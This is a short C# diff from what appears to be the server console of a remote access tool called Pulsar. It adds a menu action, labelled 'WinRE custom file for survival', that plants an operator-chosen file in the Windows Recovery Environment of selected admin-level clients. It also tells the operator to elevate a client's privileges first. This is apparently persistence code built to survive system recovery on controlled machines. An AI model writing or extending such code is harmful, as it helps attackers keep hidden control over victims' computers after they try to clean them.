@@ -1153,6 +1153,25 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private void winRECustomFileForSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    FrmCustomFileStarter frmCustomFile = new FrmCustomFileStarter(c, typeof(AddCustomFileWinRE), false);
+                    frmCustomFile.ShowDialog();
+                    frmCustomFile.Focus();
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
         private void nicknameToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
